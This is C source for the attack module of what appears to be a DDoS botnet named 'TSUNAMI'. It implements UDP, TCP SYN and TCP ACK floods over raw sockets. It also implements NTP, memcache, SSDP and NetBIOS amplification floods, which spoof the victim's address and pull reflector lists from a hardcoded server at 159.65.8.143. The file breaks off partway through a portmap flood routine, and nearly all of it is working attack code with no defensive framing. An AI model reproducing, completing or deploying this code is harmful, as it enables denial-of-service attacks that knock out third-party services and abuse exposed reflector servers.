#ifdef TSUNAMI_COMMAND
#define _GNU_SOURCE

#ifdef DEBUG
#include <stdio.h>
#endif
#include <stdint.h>
#include <arpa/inet.h>
#include <signal.h>
#include <unistd.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <linux/ip.h>
#include <linux/tcp.h>
#include <linux/udp.h>
#include <linux/if_ether.h>

#include "headers/command.h"
#include "headers/includes.h"
#include "headers/rand.h"
#include "headers/checksum.h"
#include "headers/entry.h"
#include "headers/resolve.h"
#include "headers/utils.h"
#ifdef TSUNAMI_SCAN
#include "headers/scan.h"
#endif

// Basic UDP flood
void flood_udp(struct target *t, uint16_t port, uint8_t num_of_targets)
{//159.65.8.143
	#ifdef DEBUG
	printf("In UDP\n");
	#endif
	int *fds = (int *)calloc(1, sizeof(int *));
	char **data = (char **)calloc(1, sizeof(char **));
	int i = 0;
	int p_size = 1400;
	struct sockaddr_in addr;

	for(i = 0; i < num_of_targets; i++)
	{
		data[i] = (char *)calloc(p_size + 1, sizeof(char *));
		rand_string(data[i], p_size);

		if(port == 0xffff)
			t[i].dest_addr.sin_port = rand_new() & 0xffff;
		else
			t[i].dest_addr.sin_port = htons(port);

		if((fds[i] = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) == -1)
		{
			continue;
		}

		addr.sin_family = AF_INET;
		addr.sin_port = rand_new();
		addr.sin_addr.s_addr = 0;

		if(bind(fds[i], (struct sockaddr_in *)&addr, sizeof(addr)) == -1)
		{
		}

		if(connect(fds[i], (struct sockaddr_in *)&t[i].dest_addr, sizeof(t[i].dest_addr)) == -1)
		{
		}
	}

	#ifdef DEBUG
	printf("Starting flood...\n");
	#endif

	while(TRUE)
	{
		for(i = 0; i < num_of_targets; i++)
		{
			// Retrieve the data
			char *d = data[i];
			// Actually send the data
			#ifndef DEBUG
			send(fds[i], d, p_size, MSG_NOSIGNAL);
			#else
			printf("Sending UDP!\n");
			#endif
		}
	}
}

// TCP SYN flood optimized for more PPS
void flood_tcp_syn(struct target *t, uint16_t port, uint8_t num_of_targets)
{
	#ifdef DEBUG
	printf("In TCP SYN\n");
	#endif
	int fd = -1;
	int i = 0;
	char **data = (char **)calloc(num_of_targets, sizeof(char **));

	if((fd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) == -1)
	{
		#ifdef DEBUG
		printf("Failed to initilize socket, check your privileges\n");
		#endif
		return;
	}

	i = 1;

	if(setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &i, sizeof(i)) == -1)
	{
		#ifdef DEBUG
		printf("Failed to set IP_HDRINCL\n");
		#endif
		close(fd);
		return;
	}

	for(i = 0; i < num_of_targets; i++)
	{
		struct iphdr *ip_header;
		struct tcphdr *tcp_header;

		data[i] = (char *)calloc(256, sizeof(char *));

		ip_header = (struct iphdr *)data[i];
		tcp_header = (struct tcphdr *)(ip_header + 1);

		// IPv4
		ip_header->version = 4;
		ip_header->tos = 0;
		ip_header->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr) + 20);
		ip_header->ihl = 5;
		ip_header->frag_off = htons(1 << 14);
		ip_header->ttl = 64;
		ip_header->id = htons(0xffff);
		ip_header->protocol = IPPROTO_TCP;
		ip_header->saddr = LOCAL_ADDRESS;
		ip_header->daddr = t[i].address;

		tcp_header->dest = htons(port);
		tcp_header->source = htons(0xffff);
		tcp_header->seq = htons(0xffff);
		tcp_header->doff = 10;
		// Set the flag respectively
		tcp_header->ack = FALSE;
		tcp_header->fin = FALSE;
		tcp_header->urg = FALSE;
		tcp_header->psh = FALSE;
		tcp_header->rst = FALSE;
		tcp_header->syn = TRUE;
	}

	#ifdef DEBUG
	printf("Starting flood...\n");
	#endif
	
	while(TRUE)
	{
		for(i = 0; i < num_of_targets; i++)
		{
			char *d = data[i];
			struct iphdr *ip_header = (struct iphdr *)d;
			struct tcphdr *tcp_header = (struct tcphdr *)(ip_header + 1);

			// Update the IP header
			if(ip_header->id == 0xffff)
				ip_header->id = rand_new() & 0xffff;

			// Update the TCP header
			if(tcp_header->dest == 0xffff)
				tcp_header->dest = rand_new() & 0xffff;

			if(tcp_header->source = 0xffff)
				tcp_header->source = rand_new() & 0xffff;
			
			if(tcp_header->seq == 0xffff)
				tcp_header->seq = rand_new() & 0xffff;

			// IP header checksum
			ip_header->check = 0;
			ip_header->check = ip_header_checksum((uint16_t *)ip_header, sizeof(struct iphdr));

			// TCP header checksum
			tcp_header->check = 0;
			tcp_header->check = tcp_udp_header_checksum(ip_header, tcp_header, htons(sizeof(struct tcphdr) + 20), sizeof(struct tcphdr) + 20);

			// Set the destination port
			t[i].dest_addr.sin_port = tcp_header->dest;
			#ifdef DEBUG
			printf("Sending SYN!\n");
			#else
			sendto(fd, d, sizeof(struct iphdr) + sizeof(struct tcphdr) + 20, MSG_NOSIGNAL, (struct sockaddr_in *)&t[i].dest_addr, sizeof(t[i].dest_addr));
			#endif
		}
	}
}

// TCP ACK flood optimized for a more volumetric flood
void flood_tcp_ack(struct target *t, uint16_t port, uint8_t num_of_targets)
{
	#ifdef DEBUG
	printf("In TCP ACK\n");
	#endif
	int fd = -1;
	int i = 0;
	char **data = (char **)calloc(num_of_targets, sizeof(char **));
	int p_size = 1400;

	if((fd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) == -1)
	{
		#ifdef DEBUG
		printf("Failed to initilize socket, check your privileges\n");
		#endif
		return;
	}

	i = 1;

	if(setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &i, sizeof(i)) == -1)
	{
		#ifdef DEBUG
		printf("Failed to set IP_HDRINCL\n");
		#endif
		close(fd);
		return;
	}

	for(i = 0; i < num_of_targets; i++)
	{
		struct iphdr *ip_header;
		struct tcphdr *tcp_header;
		char *p;

		data[i] = (char *)calloc(p_size + 110, sizeof(char *));

		ip_header = (struct iphdr *)data[i];
		tcp_header = (struct tcphdr *)(ip_header + 1);
		p = (char *)(tcp_header + 1);

		// IPv4
		ip_header->version = 4;
		ip_header->tos = 0;
		ip_header->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr) + p_size);
		ip_header->ihl = 5;
		ip_header->frag_off = htons(1 << 14);
		ip_header->ttl = 64;
		ip_header->id = htons(0xffff);
		ip_header->protocol = IPPROTO_TCP;
		ip_header->saddr = LOCAL_ADDRESS;
		ip_header->daddr = t[i].address;

		tcp_header->dest = htons(port);
		tcp_header->source = htons(0xffff);
		tcp_header->seq = htons(0xffff);
		tcp_header->doff = 10;
		tcp_header->window = rand_new() & 0xffff;
		// Set the flag respectively
		tcp_header->ack = TRUE;
		tcp_header->fin = FALSE;
		tcp_header->urg = FALSE;
		tcp_header->psh = FALSE;
		tcp_header->rst = FALSE;
		tcp_header->syn = FALSE;

		rand_string(p, p_size);
	}

	#ifdef DEBUG
	printf("Starting flood...\n");
	#endif
	
	while(TRUE)
	{
		for(i = 0; i < num_of_targets; i++)
		{
			char *d = data[i];
			struct iphdr *ip_header = (struct iphdr *)d;
			struct tcphdr *tcp_header = (struct tcphdr *)(ip_header + 1);
			char *p = (char *)(tcp_header + 1);

			// Update the IP header
			if(ip_header->id == 0xffff)
				ip_header->id = rand_new() & 0xffff;

			// Update the TCP header
			if(tcp_header->dest == 0xffff)
				tcp_header->dest = rand_new() & 0xffff;

			if(tcp_header->source = 0xffff)
				tcp_header->source = rand_new() & 0xffff;
			
			if(tcp_header->seq == 0xffff)
				tcp_header->seq = rand_new() & 0xffff;

			// IP header checksum
			ip_header->check = 0;
			ip_header->check = ip_header_checksum((uint16_t *)ip_header, sizeof(struct iphdr));

			// TCP header checksum
			tcp_header->check = 0;
			tcp_header->check = tcp_udp_header_checksum(ip_header, tcp_header, htons(sizeof(struct tcphdr) + 20), sizeof(struct tcphdr) + p_size);

			// Set the destination port
			t[i].dest_addr.sin_port = tcp_header->dest;
			#ifdef DEBUG
			printf("Sending ACK!\n");
			#else
			sendto(fd, d, sizeof(struct iphdr) + sizeof(struct tcphdr) + p_size, MSG_NOSIGNAL, (struct sockaddr_in *)&t[i].dest_addr, sizeof(t[i].dest_addr));
			#endif
		}
	}
}

// NTP amplification flood
void flood_ntp(struct target *t, uint16_t port, uint8_t num_of_targets)
{
	#ifdef DEBUG
	printf("In NTP\n");
	#endif
	int i = 0;
	struct reflectors *f;
	int fd = -1;
	struct sockaddr_in dest_addr;
	struct resolve *dns;
	struct entry *e;
	char buf[DNS_TXT_MAX_SIZE];
	char buf2[MAX_REFLECTORS * 4 + 1];
	int ret = 0;
	char *s = buf2;
	int fd2 = -1;
	char **data = (char **)calloc(num_of_targets, sizeof(char **));
	int j = 0;
	struct request r;

	r.vector = htons(VECTOR_NTP);
	r.count = htonl(MAX_REFLECTORS);

	if((fd2 = socket(PF_INET, SOCK_RAW, IPPROTO_TCP)) == -1)
	{
		#ifdef DEBUG
		printf("Failed to initilize the raw socket, check your privileges\n");
		#endif
		free(data);
		return;
	}

	i = 1;

	if(setsockopt(fd2, IPPROTO_IP, IP_HDRINCL, &i, sizeof(i)) == -1)
	{
		#ifdef DEBUG
		printf("Failed to set IP_HDRINCL\n");
		#endif
		free(data);
		close(fd2);
		return;
    }

	if((fd = socket(AF_INET, SOCK_STREAM, 0)) == -1)
	{
		close(fd2);
		free(data);
		return;
	}

	dest_addr.sin_family = AF_INET;
	dest_addr.sin_port = htons(REFLECTOR_SERVER_PORT);
	dest_addr.sin_addr.s_addr = INET_ADDR(159,65,8,143);

	if(connect(fd, (struct sockaddr_in *)&dest_addr, sizeof(dest_addr)) == -1)
	{
		#ifdef DEBUG
		printf("Failed to connect to the reflector server, returning\n");
		#endif
		free(dns);
		close(fd);
		close(fd2);
		free(data);
		return;
	}

	#ifdef DEBUG
	printf("Connected to the reflector server!\n");
	#endif

	if(send(fd, &r, sizeof(r), MSG_NOSIGNAL) < 1)
	{
		#ifdef DEBUG
		printf("Failed to request the vector/count\n");
		#endif
		free(dns);
		close(fd);
		close(fd2);
		free(data);
		return;
	}

	#ifdef DEBUG
	printf("Successfully requested %d reflectors\n", ntohl(r.count));
	#endif

	ret = recv(fd, buf2, MAX_REFLECTORS * 4 + 1, 0);
	if(ret < 1)
	{
		#ifdef DEBUG
		printf("Failed to retrieve reflectors\n");
		#endif
		free(dns);
		close(fd);
		close(fd2);
		free(data);
		return;
	}

	#ifdef DEBUG
	printf("Processing reflectors...\n");
	#endif

	f = (struct reflectors *)calloc(MAX_REFLECTORS, sizeof(struct reflectors));
	for(i = 0; i < MAX_REFLECTORS; i++)
	{
		f[i].address = *((uint32_t *)s);
		s += sizeof(uint32_t);
		#ifdef DEBUG
		printf("Processed reflector %d.%d.%d.%d\n", f[i].address & 0xff, (f[i].address >> 8) & 0xff, (f[i].address >> 16) & 0xff, (f[i].address >> 24) & 0xff);
		#endif
	}

	#ifdef DEBUG
	printf("Successfully processed reflectors\n");
	#endif

	for(i = 0; i < num_of_targets; i++)
	{
		struct iphdr *ip_header;
		struct udphdr *udp_header;

		data[i] = (char *)calloc(128, sizeof(char *));

		ip_header = (struct iphdr *)data[i];
		udp_header = (struct udphdr *)(ip_header + 1);

		ip_header->ihl = 5;
		ip_header->version = 4;
		ip_header->tos = 0;
		ip_header->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr) + 8);
		ip_header->id = htons(0xffff);
		ip_header->frag_off = 0;
		ip_header->ttl = 255;
		ip_header->protocol = IPPROTO_UDP;
		// Set the source address to the target address
		ip_header->saddr = t[i].address;

		udp_header->source = htons(0xffff);
		udp_header->dest = htons(123);
		util_memcpy(udp_header + sizeof(struct udphdr), "\x17\x00\x03\x2a\x00\x00\x00\x00", 8);
		udp_header->len = htons(sizeof(struct udphdr) + 8);
	}

	while(TRUE)
	{
		if(j == MAX_REFLECTORS)
			j = 0;
		for(i = 0; i < num_of_targets; i++)
		{
			char *d = data[i];
			struct iphdr *ip_header = (struct iphdr *)d;
			struct udphdr *udp_header = (struct udphdr *)(ip_header + 1);

			// Update the IP header
			if(ip_header->id == 0xffff)
				ip_header->id = rand_new() & 0xffff;
		
			// Update the UDP header
			if(udp_header->source == 0xffff)
				udp_header->source = rand_new() & 0xffff;

			// Set the destination address to a reflector
			ip_header->daddr = f[j].address;

			// IP header checksum
			ip_header->check = 0;
			ip_header->check = ip_header_checksum((uint16_t *)ip_header, sizeof(struct iphdr));

			// UDP header checksum
			udp_header->check = 0;
			udp_header->check = tcp_udp_header_checksum(ip_header, udp_header, udp_header->len, sizeof(struct iphdr) + sizeof(struct udphdr) + 8);

			#ifdef DEBUG
			printf("Sending NTP!\n");
			#else
			sendto(fd2, d, sizeof(struct iphdr) + sizeof(struct udphdr) + 8, 0, (struct sockaddr_in *)&t[i].dest_addr, sizeof(t[i].dest_addr));
			#endif
		}
		j++;
	}
}

// MEMCACHE amplification flood
void flood_memcache(struct target *t, uint16_t port, uint8_t num_of_targets)
{
	#ifdef DEBUG
	printf("In MEMCACHE\n");
	#endif
	int i = 0;
	struct reflectors *f;
	int fd = -1;
	struct sockaddr_in dest_addr;
	struct resolve *dns;
	struct entry *e;
	char buf[DNS_TXT_MAX_SIZE];
	char buf2[MAX_REFLECTORS * 4 + 1];
	int ret = 0;
	char *s = buf2;
	int fd2 = -1;
	char **data = (char **)calloc(num_of_targets, sizeof(char **));
	int j = 0;
	struct request r;

	r.vector = htons(VECTOR_MEMCACHE);
	r.count = htonl(MAX_REFLECTORS);

	if((fd2 = socket(PF_INET, SOCK_RAW, IPPROTO_TCP)) == -1)
	{
		#ifdef DEBUG
		printf("Failed to initilize the raw socket, check your privileges\n");
		#endif
		free(data);
		return;
	}

	i = 1;

	if(setsockopt(fd2, IPPROTO_IP, IP_HDRINCL, &i, sizeof(i)) == -1)
	{
		#ifdef DEBUG
		printf("Failed to set IP_HDRINCL\n");
		#endif
		free(data);
		close(fd2);
		return;
    }

	if((fd = socket(AF_INET, SOCK_STREAM, 0)) == -1)
	{
		close(fd2);
		free(data);
		return;
	}

	dest_addr.sin_family = AF_INET;
	dest_addr.sin_port = htons(REFLECTOR_SERVER_PORT);
	dest_addr.sin_addr.s_addr = INET_ADDR(159,65,8,143);

	if(connect(fd, (struct sockaddr_in *)&dest_addr, sizeof(dest_addr)) == -1)
	{
		#ifdef DEBUG
		printf("Failed to connect to the reflector server, returning\n");
		#endif
		free(dns);
		close(fd);
		close(fd2);
		free(data);
		return;
	}

	#ifdef DEBUG
	printf("Connected to the reflector server!\n");
	#endif

	if(send(fd, &r, sizeof(r), MSG_NOSIGNAL) < 1)
	{
		#ifdef DEBUG
		printf("Failed to request the vector/count\n");
		#endif
		free(dns);
		close(fd);
		close(fd2);
		free(data);
		return;
	}

	#ifdef DEBUG
	printf("Successfully requested %d reflectors\n", ntohl(r.count));
	#endif

	ret = recv(fd, buf2, MAX_REFLECTORS * 4 + 1, 0);
	if(ret < 1)
	{
		#ifdef DEBUG
		printf("Failed to retrieve reflectors\n");
		#endif
		free(dns);
		close(fd);
		close(fd2);
		free(data);
		return;
	}

	#ifdef DEBUG
	printf("Processing reflectors...\n");
	#endif

	f = (struct reflectors *)calloc(MAX_REFLECTORS, sizeof(struct reflectors));
	for(i = 0; i < MAX_REFLECTORS; i++)
	{
		f[i].address = *((uint32_t *)s);
		s += sizeof(uint32_t);
		#ifdef DEBUG
		printf("Processed reflector %d.%d.%d.%d\n", f[i].address & 0xff, (f[i].address >> 8) & 0xff, (f[i].address >> 16) & 0xff, (f[i].address >> 24) & 0xff);
		#endif
	}

	#ifdef DEBUG
	printf("Successfully processed reflectors\n");
	#endif

	for(i = 0; i < num_of_targets; i++)
	{
		struct iphdr *ip_header;
		struct udphdr *udp_header;

		data[i] = (char *)calloc(128, sizeof(char *));

		ip_header = (struct iphdr *)data[i];
		udp_header = (struct udphdr *)(ip_header + 1);

		ip_header->ihl = 5;
		ip_header->version = 4;
		ip_header->tos = 0;
		ip_header->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr) + 15);
		ip_header->id = htons(0xffff);
		ip_header->frag_off = 0;
		ip_header->ttl = 255;
		ip_header->protocol = IPPROTO_UDP;
		// Set the source address to the target address
		ip_header->saddr = t[i].address;

		udp_header->source = htons(0xffff);
		udp_header->dest = htons(11211);
		util_memcpy(udp_header + sizeof(struct udphdr), "\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n", 15);
		udp_header->len = htons(sizeof(struct udphdr) + 15);
	}

	while(TRUE)
	{
		if(j == MAX_REFLECTORS)
			j = 0;
		for(i = 0; i < num_of_targets; i++)
		{
			char *d = data[i];
			struct iphdr *ip_header = (struct iphdr *)d;
			struct udphdr *udp_header = (struct udphdr *)(ip_header + 1);

			// Update the IP header
			if(ip_header->id == 0xffff)
				ip_header->id = rand_new() & 0xffff;
		
			// Update the UDP header
			if(udp_header->source == 0xffff)
				udp_header->source = rand_new() & 0xffff;

			// Set the destination address to a reflector
			ip_header->daddr = f[j].address;

			// IP header checksum
			ip_header->check = 0;
			ip_header->check = ip_header_checksum((uint16_t *)ip_header, sizeof(struct iphdr));

			// UDP header checksum
			udp_header->check = 0;
			udp_header->check = tcp_udp_header_checksum(ip_header, udp_header, udp_header->len, sizeof(struct iphdr) + sizeof(struct udphdr) + 15);

			#ifdef DEBUG
			printf("Sending MEMCACHE!\n");
			#else
			sendto(fd2, d, sizeof(struct iphdr) + sizeof(struct udphdr) + 15, 0, (struct sockaddr_in *)&t[i].dest_addr, sizeof(t[i].dest_addr));
			#endif
		}
		j++;
	}
}

// SSDP amplification flood
void flood_ssdp(struct target *t, uint16_t port, uint8_t num_of_targets)
{
	#ifdef DEBUG
	printf("In SSDP\n");
	#endif
	int i = 0;
	struct reflectors *f;
	int fd = -1;
	struct sockaddr_in dest_addr;
	struct resolve *dns;
	struct entry *e;
	char buf[DNS_TXT_MAX_SIZE];
	char buf2[MAX_REFLECTORS * 4 + 1];
	int ret = 0;
	char *s = buf2;
	int fd2 = -1;
	char **data = (char **)calloc(num_of_targets, sizeof(char **));
	int j = 0;
	struct request r;

	r.vector = htons(VECTOR_SSDP);
	r.count = htonl(MAX_REFLECTORS);

	if((fd2 = socket(PF_INET, SOCK_RAW, IPPROTO_TCP)) == -1)
	{
		#ifdef DEBUG
		printf("Failed to initilize the raw socket, check your privileges\n");
		#endif
		free(data);
		return;
	}

	i = 1;

	if(setsockopt(fd2, IPPROTO_IP, IP_HDRINCL, &i, sizeof(i)) == -1)
	{
		#ifdef DEBUG
		printf("Failed to set IP_HDRINCL\n");
		#endif
		free(data);
		close(fd2);
		return;
    }

	if((fd = socket(AF_INET, SOCK_STREAM, 0)) == -1)
	{
		close(fd2);
		free(data);
		return;
	}

	dest_addr.sin_family = AF_INET;
	dest_addr.sin_port = htons(REFLECTOR_SERVER_PORT);
	dest_addr.sin_addr.s_addr = INET_ADDR(159,65,8,143);

	if(connect(fd, (struct sockaddr_in *)&dest_addr, sizeof(dest_addr)) == -1)
	{
		#ifdef DEBUG
		printf("Failed to connect to the reflector server, returning\n");
		#endif
		free(dns);
		close(fd);
		close(fd2);
		free(data);
		return;
	}

	#ifdef DEBUG
	printf("Connected to the reflector server!\n");
	#endif

	if(send(fd, &r, sizeof(r), MSG_NOSIGNAL) < 1)
	{
		#ifdef DEBUG
		printf("Failed to request the vector/count\n");
		#endif
		free(dns);
		close(fd);
		close(fd2);
		free(data);
		return;
	}

	#ifdef DEBUG
	printf("Successfully requested %d reflectors\n", ntohl(r.count));
	#endif

	ret = recv(fd, buf2, MAX_REFLECTORS * 4 + 1, 0);
	if(ret < 1)
	{
		#ifdef DEBUG
		printf("Failed to retrieve reflectors\n");
		#endif
		free(dns);
		close(fd);
		close(fd2);
		free(data);
		return;
	}

	#ifdef DEBUG
	printf("Processing reflectors...\n");
	#endif

	f = (struct reflectors *)calloc(MAX_REFLECTORS, sizeof(struct reflectors));
	for(i = 0; i < MAX_REFLECTORS; i++)
	{
		f[i].address = *((uint32_t *)s);
		s += sizeof(uint32_t);
		#ifdef DEBUG
		printf("Processed reflector %d.%d.%d.%d\n", f[i].address & 0xff, (f[i].address >> 8) & 0xff, (f[i].address >> 16) & 0xff, (f[i].address >> 24) & 0xff);
		#endif
	}

	#ifdef DEBUG
	printf("Successfully processed reflectors\n");
	#endif

	for(i = 0; i < num_of_targets; i++)
	{
		struct iphdr *ip_header;
		struct udphdr *udp_header;

		data[i] = (char *)calloc(256, sizeof(char *));

		ip_header = (struct iphdr *)data[i];
		udp_header = (struct udphdr *)(ip_header + 1);

		ip_header->ihl = 5;
		ip_header->version = 4;
		ip_header->tos = 0;
		ip_header->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr) + 90);
		ip_header->id = htons(0xffff);
		ip_header->frag_off = 0;
		ip_header->ttl = 255;
		ip_header->protocol = IPPROTO_UDP;
		// Set the source address to the target address
		ip_header->saddr = t[i].address;

		udp_header->source = htons(0xffff);
		udp_header->dest = htons(1900);
		util_memcpy(udp_header + sizeof(struct udphdr), "M-SEARCH * HTTP/1.1\r\nHost:239.255.255.250:1900\r\nST:ssdp:all\r\nMan:\"ssdp:discover\"\r\nMX:3\r\n\r\n", 90);
		udp_header->len = htons(sizeof(struct udphdr) + 90);
	}

	while(TRUE)
	{
		if(j == MAX_REFLECTORS)
			j = 0;
		for(i = 0; i < num_of_targets; i++)
		{
			char *d = data[i];
			struct iphdr *ip_header = (struct iphdr *)d;
			struct udphdr *udp_header = (struct udphdr *)(ip_header + 1);

			// Update the IP header
			if(ip_header->id == 0xffff)
				ip_header->id = rand_new() & 0xffff;
		
			// Update the UDP header
			if(udp_header->source == 0xffff)
				udp_header->source = rand_new() & 0xffff;

			// Set the destination address to a reflector
			ip_header->daddr = f[j].address;

			// IP header checksum
			ip_header->check = 0;
			ip_header->check = ip_header_checksum((uint16_t *)ip_header, sizeof(struct iphdr));

			// UDP header checksum
			udp_header->check = 0;
			udp_header->check = tcp_udp_header_checksum(ip_header, udp_header, udp_header->len, sizeof(struct iphdr) + sizeof(struct udphdr) + 90);

			#ifdef DEBUG
			printf("Sending SSDP!\n");
			#else
			sendto(fd2, d, sizeof(struct iphdr) + sizeof(struct udphdr) + 90, 0, (struct sockaddr_in *)&t[i].dest_addr, sizeof(t[i].dest_addr));
			#endif
		}
		j++;
	}
}

// NETBIOS amplification flood
void flood_netbios(struct target *t, uint16_t port, uint8_t num_of_targets)
{
	#ifdef DEBUG
	printf("In NETBIOS\n");
	#endif
	int i = 0;
	struct reflectors *f;
	int fd = -1;
	struct sockaddr_in dest_addr;
	struct resolve *dns;
	struct entry *e;
	char buf[DNS_TXT_MAX_SIZE];
	char buf2[MAX_REFLECTORS * 4 + 1];
	int ret = 0;
	char *s = buf2;
	int fd2 = -1;
	char **data = (char **)calloc(num_of_targets, sizeof(char **));
	int j = 0;
	struct request r;

	r.vector = htons(VECTOR_NETBIOS);
	r.count = htonl(MAX_REFLECTORS);

	if((fd2 = socket(PF_INET, SOCK_RAW, IPPROTO_TCP)) == -1)
	{
		#ifdef DEBUG
		printf("Failed to initilize the raw socket, check your privileges\n");
		#endif
		free(data);
		return;
	}

	i = 1;

	if(setsockopt(fd2, IPPROTO_IP, IP_HDRINCL, &i, sizeof(i)) == -1)
	{
		#ifdef DEBUG
		printf("Failed to set IP_HDRINCL\n");
		#endif
		free(data);
		close(fd2);
		return;
    }

	if((fd = socket(AF_INET, SOCK_STREAM, 0)) == -1)
	{
		close(fd2);
		free(data);
		return;
	}

	dest_addr.sin_family = AF_INET;
	dest_addr.sin_port = htons(REFLECTOR_SERVER_PORT);
	dest_addr.sin_addr.s_addr = INET_ADDR(159,65,8,143);

	if(connect(fd, (struct sockaddr_in *)&dest_addr, sizeof(dest_addr)) == -1)
	{
		#ifdef DEBUG
		printf("Failed to connect to the reflector server, returning\n");
		#endif
		free(dns);
		close(fd);
		close(fd2);
		free(data);
		return;
	}

	#ifdef DEBUG
	printf("Connected to the reflector server!\n");
	#endif

	if(send(fd, &r, sizeof(r), MSG_NOSIGNAL) < 1)
	{
		#ifdef DEBUG
		printf("Failed to request the vector/count\n");
		#endif
		free(dns);
		close(fd);
		close(fd2);
		free(data);
		return;
	}

	#ifdef DEBUG
	printf("Successfully requested %d reflectors\n", ntohl(r.count));
	#endif

	ret = recv(fd, buf2, MAX_REFLECTORS * 4 + 1, 0);
	if(ret < 1)
	{
		#ifdef DEBUG
		printf("Failed to retrieve reflectors\n");
		#endif
		free(dns);
		close(fd);
		close(fd2);
		free(data);
		return;
	}

	#ifdef DEBUG
	printf("Processing reflectors...\n");
	#endif

	f = (struct reflectors *)calloc(MAX_REFLECTORS, sizeof(struct reflectors));
	for(i = 0; i < MAX_REFLECTORS; i++)
	{
		f[i].address = *((uint32_t *)s);
		s += sizeof(uint32_t);
		#ifdef DEBUG
		printf("Processed reflector %d.%d.%d.%d\n", f[i].address & 0xff, (f[i].address >> 8) & 0xff, (f[i].address >> 16) & 0xff, (f[i].address >> 24) & 0xff);
		#endif
	}

	#ifdef DEBUG
	printf("Successfully processed reflectors\n");
	#endif

	for(i = 0; i < num_of_targets; i++)
	{
		struct iphdr *ip_header;
		struct udphdr *udp_header;

		data[i] = (char *)calloc(256, sizeof(char *));

		ip_header = (struct iphdr *)data[i];
		udp_header = (struct udphdr *)(ip_header + 1);

		ip_header->ihl = 5;
		ip_header->version = 4;
		ip_header->tos = 0;
		ip_header->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr) + 50);
		ip_header->id = htons(0xffff);
		ip_header->frag_off = 0;
		ip_header->ttl = 255;
		ip_header->protocol = IPPROTO_UDP;
		// Set the source address to the target address
		ip_header->saddr = t[i].address;

		udp_header->source = htons(0xffff);
		udp_header->dest = htons(137);
		util_memcpy(udp_header + sizeof(struct udphdr), "\xe5\xd8\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x20\x43\x4b\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x00\x00\x21\x00\x01", 50);
		udp_header->len = htons(sizeof(struct udphdr) + 50);
	}

	while(TRUE)
	{
		if(j == MAX_REFLECTORS)
			j = 0;
		for(i = 0; i < num_of_targets; i++)
		{
			char *d = data[i];
			struct iphdr *ip_header = (struct iphdr *)d;
			struct udphdr *udp_header = (struct udphdr *)(ip_header + 1);

			// Update the IP header
			if(ip_header->id == 0xffff)
				ip_header->id = rand_new() & 0xffff;
		
			// Update the UDP header
			if(udp_header->source == 0xffff)
				udp_header->source = rand_new() & 0xffff;

			// Set the destination address to a reflector
			ip_header->daddr = f[j].address;

			// IP header checksum
			ip_header->check = 0;
			ip_header->check = ip_header_checksum((uint16_t *)ip_header, sizeof(struct iphdr));

			// UDP header checksum
			udp_header->check = 0;
			udp_header->check = tcp_udp_header_checksum(ip_header, udp_header, udp_header->len, sizeof(struct iphdr) + sizeof(struct udphdr) + 51);

			#ifdef DEBUG
			printf("Sending NETBIOS!\n");
			#else
			sendto(fd2, d, sizeof(struct iphdr) + sizeof(struct udphdr) + 51, 0, (struct sockaddr_in *)&t[i].dest_addr, sizeof(t[i].dest_addr));
			#endif
		}
		j++;
	}
}

// PORTMAP amplification flood
void flood_portmap(struct target *t, uint16_t port, uint8_t num_of_targets)
{
	#ifdef DEBUG
	printf("In PORTMAP\n");
	#endif
	int i = 0;
	struct reflectors *f;
	int fd = -1;
	struct sockaddr_in dest_addr;
	struct resolve *dns;
	struct entry *e;
	char buf[DNS_TXT_MAX_SIZE];
	char buf2[MAX_REFLECTORS * 4 + 1];
	int ret = 0;
	char *s = buf2;
	int fd2 = -1;
	char **data = (char **)calloc(num_of_targets, sizeof(char **));
	int j = 0;
	struct request r;

	r.vector = htons(VECTOR_PORTMAP);
	r.count = htonl(MAX_REFLECTORS);

	if((fd2 = socket(PF_INET, SOCK_RAW, IPPROTO_TCP)) == -1)
	{
		#ifdef DEBUG
		printf("Failed to initilize the raw socket, check your privileges\n");
		#endif
		free(data);
		return;
	}

	i = 1;

	if(setsockopt(fd2, IPPROTO_IP, IP_HDRINCL, &i, sizeof(i)) == -1)
	{
		#ifdef DEBUG
		printf("Failed to set IP_HDRINCL\n");
		#endif
		free(data);
		close(fd2);
		return;
    }

	if((fd = socket(AF_INET, SOCK_STREAM, 0)) == -1)
	{
		close(fd2);
		free(data);
		return;
	}

	dest_addr.sin_family = AF_INET;
	dest_addr.sin_port = htons(REFLECTOR_SERVER_PORT);
	dest_addr.sin_addr.s_addr = INET_ADDR(159,65,8,143);

	if(connect(fd, (struct sockaddr_in *)&dest_addr, sizeof(dest_addr)) == -1)
	{
		#ifdef DEBUG
		printf("Failed to connect to the reflector server, returning\n");
		#endif
		free(dns);
		close(fd);
		close(fd2);
		free(data);
		return;
	}

	#ifdef DEBUG
	printf("Connected to the reflector server!\n");
	#endif

	if(send(fd, &r, sizeof(r), MSG_NOSIGNAL) < 1)
	{
		#ifdef DEBUG
		printf("Failed to request the vector/count\n");
		#endif
		free(dns);
		close(fd);
		close(fd2);
		free(data);
		return;
	}

	#ifdef DEBUG
	printf("Successfully requested %d reflectors\n", ntohl(r.count));
	#endif

	ret = recv(fd, buf2, MAX_REFLECTORS * 4 + 1, 0);
	if(ret < 1)
	{
		#ifdef DEBUG
		printf("Failed to retrieve reflectors\n");
		#endif
		free(dns);
		close(fd);
		close(fd2);
		free(data);
		return;
	}

	#ifdef DEBUG
	printf("Processing reflectors...\n");
	#endif

	f = (struct reflectors *)calloc(MAX_REFLECTORS, sizeof(struct reflectors));
	for(i = 0; i < MAX_REFLECTORS; i++)
	{
		f[i].address = *((uint32_t *)s);
		s += sizeof(uint32_t);
		#ifdef DEBUG
